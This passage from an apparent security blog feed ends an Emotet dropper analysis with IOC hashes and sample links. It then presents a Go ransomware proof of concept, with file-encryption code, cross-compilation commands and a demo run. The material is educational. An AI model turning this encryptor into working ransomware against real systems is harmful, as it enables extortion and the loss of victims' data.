&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I have included in the recipe an additional step which creates the hash of the file, that can be used to detect if it&amp;rsquo;s malicious.&lt;/p&gt;
&lt;p&gt;You can also see the CyberChef recipe by clicking &lt;a href=&#34;https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)Raw_Inflate(0,0,&#39;Block&#39;,false,false)SHA2(&#39;256&#39;)&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The document file obtained at the end of the execution of &lt;code&gt;index.php&lt;/code&gt; is obviously malicious, being detected by multiple engines in VirusTotal, as you can see from the screenshot below:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/emotet/vtdoc.png&#34;
         alt=&#34;Screenshot from VirusTotal&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Screenshot from &lt;a href=&#34;https://www.virustotal.com/gui/file/a302a49cafa48ab0b8d686124f89eb0517a014f31fcb5dc4eb8b574854fbc0c8/detection&#34;&gt;VirusTotal&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;If you want a sample of the file, you can find it in the MalwareBazaar database following &lt;a href=&#34;https://bazaar.abuse.ch/browse.php?search=a302a49cafa48ab0b8d686124f89eb0517a014f31fcb5dc4eb8b574854fbc0c8&#34;&gt;this link&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;iocs&#34;&gt;IOCs&lt;/h2&gt;
&lt;p&gt;Here is a list of the hashes of files which were analyzed in the post:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;malware.zip				db1617dc4a09fe856aea8041b90e73467e8d51ad4bdc1fd9a7e0a3197e66339c
index.php				a48791d0e22ba693529285555ebb559bac1786bd703406deb5e1ef9ee8616cc4
INV_O2GT57A7QBKNN7.doc	a302a49cafa48ab0b8d686124f89eb0517a014f31fcb5dc4eb8b574854fbc0c8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you want to take a look at the original PHP file, you can find it &lt;a href=&#34;https://gist.github.com/andpalmier/e9a5cdd40fd2db751c07da641bc33bea&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In this post we analyzed a PHP file used to distribute Emotet, a Trojan that has been active since 2014. We saw how &lt;code&gt;index.php&lt;/code&gt; uses some basic obfuscation, especially when setting the headers; it also logs which types of OSs are accessing the page in a JSON file.&lt;/p&gt;
&lt;p&gt;At the end of the execution, a malicious document called &lt;code&gt;INV_O2GT57A7QBKNN7.doc&lt;/code&gt; is ready for the download.&lt;/p&gt;
&lt;p&gt;If you are interested in Emotet, follow &lt;a href=&#34;https://twitter.com/Cryptolaemus1&#34;&gt;@Cryptolaemus1&lt;/a&gt; on Twitter and the people in the &lt;a href=&#34;https://paste.cryptolaemus.com/about/&#34;&gt;Cryptolaemus team&lt;/a&gt;.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://www.proofpoint.com/us/blog/threat-insight/comprehensive-look-emotets-summer-2020-return&#34;&gt;A Comprehensive Look at Emotet’s Summer 2020 Return&lt;/a&gt; on ProofPoint&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zdnet.com/article/emotet-botnet-returns-after-a-five-month-absence/&#34;&gt;Emotet botnet returns after a five-month absence&lt;/a&gt; on ZDNet&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:3&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
    </item>
    
    <item>
      <title>Proof of concept of a ransowmare in Go</title>
      <link>/posts/poc-goransom/</link>
      <pubDate>Wed, 29 Jul 2020 00:00:00 +0000</pubDate>
      
      <guid>/posts/poc-goransom/</guid>
      <description>&lt;figure&gt;&lt;img src=&#34;/images/posts/goransom/thief_gopher.jpg&#34;/&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;This is a blog post about my last project: &lt;a href=&#34;https://github.com/andpalmier/goransom&#34;&gt;goransom&lt;/a&gt;, which is a proof of concept for a simple ransowmare written in Go. The purpose of the project is purely educative; I wanted to get a bit more familiar with the language and its patterns.&lt;/p&gt;
&lt;p&gt;I am not responsible for the use you make of this tool. &lt;strong&gt;Do not use it on systems where you don&amp;rsquo;t have the permission of the owner&lt;/strong&gt;.&lt;/p&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;Ransomware is a particular type of malware which encrypts the victim&amp;rsquo;s files and threatens to publish the data or prevent them from accessing the files, unless a ransom is paid. In the last years, ransomware began to represent a serious threat, especially for business. Some of the most famous cases of ransomware attacks are: &lt;a href=&#34;https://en.wikipedia.org/wiki/WannaCry_ransomware_attack&#34;&gt;WannaCry&lt;/a&gt;, &lt;a href=&#34;https://en.wikipedia.org/wiki/CryptoLocker&#34;&gt;CryptoLocker&lt;/a&gt; and &lt;a href=&#34;https://en.wikipedia.org/wiki/Locky&#34;&gt;Locky&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;While developing an actual ransomware is far from being an easy task, I decided to create a proof of concept with Go to have fun and learn something new.&lt;/p&gt;
&lt;p&gt;Go makes it easy to write malware for different reasons. Firstly, it works nearly everywhere: thanks to cross-compilation, we can write code in Go and use it to obtain an executable for all the most common architectures. Go also has a strong community, with a lot of libraries available. Lastly, it is quite easy to learn and to read, which allows malware programmers to re-engineer the code without too many hassles in case the executable gets detected by anti-viruses.&lt;/p&gt;
&lt;h2 id=&#34;technical-details&#34;&gt;Technical details&lt;/h2&gt;
&lt;p&gt;Being a proof of concept, &lt;code&gt;goransom&lt;/code&gt; won&amp;rsquo;t automatically start to encrypt the full hard drive. We don&amp;rsquo;t want to cause trouble here.&lt;/p&gt;
&lt;p&gt;Instead, the program allows to specify in input the path of the target file or folder to encrypt. &lt;code&gt;goransom&lt;/code&gt; also requires a secret string to be provided, this is going to be used to derive the key for encrypting the files.&lt;/p&gt;
&lt;p&gt;After the files are successfully encrypted, they will have a &lt;em&gt;.locked&lt;/em&gt; suffix in the filename. In order to get the original files back, the &lt;code&gt;-decrypt&lt;/code&gt; flag can be used, specifying the target files we want to decrypt and the secret which was used for the encryption.&lt;/p&gt;
&lt;h3 id=&#34;key-generation-encryption-and-decryption&#34;&gt;Key generation, encryption and decryption&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;goransom&lt;/code&gt; encrypts and decrypts the given files using &lt;a href=&#34;https://en.wikipedia.org/wiki/Advanced_Encryption_Standard&#34;&gt;AES block cipher&lt;/a&gt;, specifically with cipher feedback (CFB) mode of operation. Discussing which cipher and mode of operation works better for a ransomware is outside of scope for this post, but it has to be noted that many other options are available in the &lt;a href=&#34;https://golang.org/pkg/crypto/&#34;&gt;crypto package and its subdirectories&lt;/a&gt;.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/goransom/aescfb.png&#34;
         alt=&#34;Go makes THIS super easy! Pic from Wikipedia&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Go makes THIS super easy! &lt;a href=&#34;https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_(CFB)&#34;&gt;Pic from Wikipedia&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;Since AES allows three different key lengths: 128, 192 and 256, I decided to go for the 256-bits key, which can be obtained from a sha256 hash of the secret string given in input. Here is how the key derivation function looks like:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// given a secret returns the sha256 hash
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// used for encryption/decryption
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DeriveKey&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;secret&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sha256&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sum256&lt;/span&gt;([]byte(&lt;span style=&#34;color:#a6e22e&#34;&gt;secret&lt;/span&gt;))
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The encryption function is called for every file which has to be encrypted; it reads the content of the file and use it as a plaintext for our cipher.&lt;/p&gt;
&lt;p&gt;The initialization vector (IV) is used by many modes of operation to randomize the encryption and produce different ciphertexts when plaintext and key are the same. The security requirements of the IV are different from the ones of the key: the IV needs to be unique, but it does not need to be a secret. It is therefore quite common to include it at the beginning of the ciphertext.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// open the given file
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ioutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ReadFile&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;filePath&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
    panic(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
}

&lt;span style=&#34;color:#75715e&#34;&gt;// create AES CFB cipher
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aes&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NewCipher&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;secretKey&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
    panic(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
}

&lt;span style=&#34;color:#75715e&#34;&gt;// The IV needs to be unique, but not secure. therefore it&amp;#39;s common to
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// include it at the beginning of the ciphertext.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// See here: https://golang.org/pkg/crypto/cipher/
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make([]&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;aes&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BlockSize&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;len(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;))
&lt;span style=&#34;color:#a6e22e&#34;&gt;iv&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt;[:&lt;span style=&#34;color:#a6e22e&#34;&gt;aes&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BlockSize&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;io&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ReadFull&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Reader&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;iv&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
    panic(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
}

&lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cipher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NewCFBEncrypter&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;iv&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;XORKeyStream&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;aes&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BlockSize&lt;/span&gt;:], &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;// write the ciphertext in the file
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ioutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WriteFile&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;filePath&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0644&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A &lt;em&gt;&amp;quot;.locked&amp;quot;&lt;/em&gt; suffix is then appended to the filename.&lt;/p&gt;
&lt;p&gt;The decryption works in a similar way: the content of the locked file is used as a ciphertext. Part of this code is taken directly form the &lt;a href=&#34;https://golang.org/pkg/crypto/cipher/&#34;&gt;documentation of the &lt;em&gt;crypto/cipher&lt;/em&gt; package&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// open the given file
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ioutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ReadFile&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;filePath&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
    panic(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
}

&lt;span style=&#34;color:#75715e&#34;&gt;// create AES CFB cipher
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aes&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NewCipher&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;secretKey&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
    panic(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
}

&lt;span style=&#34;color:#75715e&#34;&gt;// The IV needs to be unique, but not secure. Therefore it&amp;#39;s common to
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// include it at the beginning of the ciphertext.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// See here: https://golang.org/pkg/crypto/cipher/
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt;) &amp;lt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aes&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BlockSize&lt;/span&gt; {
    panic(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ciphertext too short&amp;#34;&lt;/span&gt;)
}

&lt;span style=&#34;color:#a6e22e&#34;&gt;iv&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt;[:&lt;span style=&#34;color:#a6e22e&#34;&gt;aes&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BlockSize&lt;/span&gt;]
&lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;aes&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BlockSize&lt;/span&gt;:]

&lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cipher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NewCFBDecrypter&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;iv&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;stream&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;XORKeyStream&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;// write the plaintext in the file
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ioutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WriteFile&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;filePath&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;ciphertext&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0644&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After the decryption, the &lt;em&gt;.locked&lt;/em&gt; suffix is removed from the filename, which - if the decryption worked correctly - should now contain the original file.&lt;/p&gt;
&lt;h3 id=&#34;compile-for-multiple-architectures&#34;&gt;Compile for multiple architectures&lt;/h3&gt;
&lt;p&gt;I already mentioned how useful the cross-compilation is, but examples were not provided, so here they are.&lt;/p&gt;
&lt;p&gt;Assuming we have our copy of &lt;code&gt;goransom&lt;/code&gt;, if we want to build it for our architecture and OS, it is enough to use:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ go build goransom.go
$ file goransom
goransom: ELF 64-bit LSB executable, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, statically linked, Go BuildID&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;aWuhsabAbd9um74h1Lud/gZHBAWcx_U9xYPmr8YQ-/j2tKdv2LtApZOqZSW7qb/QmkfvEG1dwo6BWtKUA5x, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A &lt;code&gt;goransom&lt;/code&gt; executable will be created, which can be launched as usual. However, if we want to compile the same code for different OSes and architecture, things are not much more complicated.&lt;/p&gt;
&lt;p&gt;Here is how to get a Windows executable on Linux:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ GOOS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;windows GOARCH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;386&lt;/span&gt; go build -o goransom.exe goransom.go
$ file goransom.exe
goransom.exe: PE32 executable &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;console&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Intel &lt;span style=&#34;color:#ae81ff&#34;&gt;80386&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;stripped to external PDB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; MS Windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and this is the process for MacOS:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ GOOS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;darwin GOARCH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;amd64 go build ransom.go
$ file goransom
goransom: Mach-O 64-bit x86_64 executable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;a-first-run&#34;&gt;A first run&lt;/h2&gt;
&lt;p&gt;This section provides just an example of how to run &lt;code&gt;goransom&lt;/code&gt; on Linux. Assuming we have the following structure:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ tree
.
├── goransom
└── folder
    └── textfile

$ cat folder/textfile
THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now &lt;code&gt;goransom&lt;/code&gt; will be used to encrypt all the files in &lt;code&gt;folder&lt;/code&gt; using &lt;code&gt;supersecret&lt;/code&gt; as a secret:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ ./goransom -secret supersecret -target folder
Operating on folder
Operating on folder/textfile
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;textfile&lt;/code&gt; is now encrypted and has been renamed &lt;code&gt;textfile.locked&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ tree
.
├── goransom
└── folder
    └── textfile.locked

$ cat folder/textfile.locked
�C4�w��i�G⛘&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;+�~O&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;�@f1
                     �&amp;lt;
                       �0k&amp;gt;&amp;lt;�ZlEV&amp;amp;yj��;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;�&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1m%

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Assuming other files were in the &lt;code&gt;folder&lt;/code&gt; they would be locked as well, since the entire folder was specified as a target for &lt;code&gt;goransom&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Decrypting the file is quite easy: just repeat the command for the encryption (same &lt;code&gt;target&lt;/code&gt; and same &lt;code&gt;secret&lt;/code&gt;) and append the &lt;code&gt;-decrypt&lt;/code&gt; command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ ./goransom -secret supersecret -target folder -decrypt
Operating on folder
Operating on folder/textfile.locked

$ tree
.
├── goransom
└── folder
    └── textfile

$ cat folder/textfile
THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME
